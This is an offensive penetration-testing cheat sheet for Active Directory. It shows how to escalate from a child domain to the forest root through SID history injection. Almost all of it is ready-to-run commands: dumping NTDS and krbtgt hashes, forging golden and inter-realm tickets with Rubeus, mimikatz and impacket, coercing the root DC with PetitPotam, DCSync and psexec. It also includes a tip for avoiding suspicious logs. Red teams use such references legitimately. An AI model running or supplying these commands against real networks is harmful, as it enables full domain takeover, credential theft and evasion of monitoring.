# Child Domain to Parent Domain - Forest Compromise - extra SIDs (parent/child) (child/parent)

Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the Enterprise Admins group in the SID history field.

## Steps:

### 1) Trust Discovery and details

Netexec

    nxc ldap IP -u USER -p PASSWORD --dc-list

PyWerView

    pywerview get netdomaintrust -w child.domain.local

### 2) Trust confirmation

nltest

    nltest /trusted_domains

PowerShell

    ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

BloodyAD

    bloodyAD --host IP -d child.domain.local -u USER -p 'PASSWORD' get trusts

### 3) Extract KRBTGT hash and required SIDs

Dump child KRBTGT hash (Requires domain admin creds in child domain)

    nxc smb IP -u USER -p 'PASSWORD' --ntds

Get Child Domain SID

    (Get-ADDomain).DomainSID

Get Parent Enterprise Admins SID

    Get-ADGroup -Identity "Enterprise Admins" -Server dc.parentdomain.local

### 4) Forge cross-domain Golden Ticket

    rubeus.exe golden /rc4:KRBTGT_RC4_HASH /user:administrator /domain:child.domain.local /sid:CHILD_DOMAIN_SID /sids:PARENT_ENTERPRISE_DOMAIN_SID /outfile:ticket 

### 5) Pass-the-Ticket into the Forest Root

Pass the ticket

    rubeus.exe ptt /ticket:TICKET_FROM_PREVIOUS_COMMAND

List ticket cache

    klist

Verify access

    dir \\dc.parentdomain.local\c$

### 6) Harvest forest root secrets from Linux

Import ticket to Linux for further usage

    cat ticket.b64 | base64 -d > ticket.kirbi
    impacket-ticketConverter ticket.kirbi ticket.ccache
    export KRB5CCNAME=ticket.ccache

Dump secrets

    nxc smb PARENT_DC_IP dc.parentdomain.local -k --use-kcache --lsa

### 7) Full Forest Compromise

Dump EVERYTHING

    impacket-secretsdump -k -no-pass dc.parentdomain.local -just-dc

Connect

    impacket-psexec -k -no-pass dc.parentdomain.local

### BONUS: Steps 4 and 5 are automated in Netexec with this command:

    nxc ldap IP -u USER -p PASSWORD -M raisechild

Validate forged ticket

    export KRB5CCNAME=Administrator.ccache

Dump secrets from parent DC
    
    nxc smb IP dc.parentdomain.local -k --use-kcache --lsa

## Alternate Method: Coercion-Based Compromise

### 1) Confirm the coercion vector

In the Child domain DC, list the spool's pipe over the DC host to confirm the Print Spooler service is reachabale

    cd Users/Public
    powershell ls \\dc\pipe\spools

### 2) Monitor for the DC machine account takeover

On child DC

    rubeus.exe monitor /interval:5 /filteruser:DC$ /nowrap

### 3) Coerce the forest root with PetitPotam

    python3 PetitPotam.py -u USER -p PASSWORD -d child.domain.local cdc01.child.domain.local dc.parentdomain.local

### 4) Convert the captured ticket

    impacket-ticketConverter newticket.kirbi newticket.ccahce

### 5) DCSync with the captured machine account

    export KRB5CCNAME=newticket.ccache
    impacket-secretsdump -k -no-pass dc.parentdomain.local -just-dc

## With the trust key

### 1) Get the trust key, look at the [in] value in the result

    Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc

OR

    Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\parentDomain$"'

### 2) Forge the referral ticket

    Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<current_domain_SID> /sids:<enterprise_admins_SID>-<RID> /rc4:<key> /service:krbtgt /target:parentDomain.local /ticket:trust.kirbi"'

### 3) Request an ST with the previous TGT and access service

#New tools for more fun

    .\asktgs.exe trust.kirbi CIFS/dc.parentDomain.local
    .\kirbikator.exe lsa .\CIFS.dc.parentDomain.local.kirbi
    ls \\dc.parentDomain.local\c$

##### Or classically
    
    .\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/dc.parentDomain.local /dc:dc.parentDomain.local /ptt
    ls \\dc.parentDomain.local\c$

## With the krbtgt hash

Exactly the same attack, but with the krbtgt hash that can be extracted like this :

    Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

To avoid some suspicious logs, use multiple values can be added in SID History :

    Invoke-Mimikatz -Command '"kerberos::golden /user:dc$ /domain:domain.local /sid:<current_domain_SID> /groups:516 /sids:<parent_domain_SID>-516,S-1-5-9 /krbtgt:<krbtgt_hash> /ptt"'
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:parentDomain\Administrator /domain:parentDomain.local"'


#### 1) Golden Ticket

    Get-DomainSID -Domain DOMAIN (Powerview)

    Get-DomainSID -Domain TARGET_DOMAIN (Powerview)

    mimikatz lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt

    mimikatz kerberos::golden /user:Administrator /krbtgt:KRBTGT_HASH /domain:DOMAIN /sid:USER_SID /sids:ROOT_DOMAIN_SID-519 /ptt

## OR

    lookupsid.py -domain-sids DOMAIN/USER:'PASSWORD'@DC_IP 0

    ticketer.py -nthash CHILD_KRBTGT_HASH -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid PARENT_DOMAIN_SID-519 goldenuser

## OR

##### The new Golden Ticket will be written at the path specified in -w

    raiseChild.py -w ./ticket.ccache child.domain.local/Administrator:password

##### Dump the Administrator's hash of the root domain

    raiseChild.py child.domain.local/Administrator:password

##### PSEXEC on a machine

    raiseChild.py -target-exec <target> child.domain.local/Administrator:password

#### 2) inter_realm_ticket TRUST (parent/child) (child/parent)

    mimikatz lsadump::trust /patch

    mimikatz kerberos::golden /user:Administrator /domain:DOMAIN /sid:DOMAIN_SID /aes256:TRUST_KEY_AES256 /sids:TARGET_DOMAIN_SID-519 /service:krbtgt /target:TARGET_DOMAIN /ptt

## OR

    ticketer.py -nthash TRUST_KEY -domain-sid CHILD_SID -domain CHILD_DOMAIN -extra-sid PARENT_DOAMIN_SID-519 -spn krbtgt/PARENT_DOMAIN goldenuser

    getST.py -k -no-pass -spn cifs/DC_FQDN PARENT_DOMAIN/trustfakeuser@PARENT_DOMAIN -debug

### With these attacks, we perform Pass-the-Ticket
